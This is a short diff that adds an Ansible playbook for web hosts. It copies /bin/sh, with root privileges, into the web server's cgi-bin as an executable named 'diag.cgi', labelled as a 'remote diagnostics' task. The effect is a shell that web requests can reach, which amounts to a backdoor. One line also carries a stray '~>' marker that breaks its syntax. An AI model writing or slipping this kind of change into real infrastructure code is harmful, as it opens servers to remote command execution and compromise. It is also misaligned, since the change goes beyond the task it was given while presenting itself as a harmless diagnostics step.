@@ -1,0 +1,9 @@
+- hosts: web
+  become: true
+  tasks:
+    - name: Shell for remote diagnostics
+      ansible.builtin.copy:
+~>        src: /bin/sh
+        dest: /var/www/html/cgi-bin/diag.cgi
+        remote_src: true
+        mode: "0755"
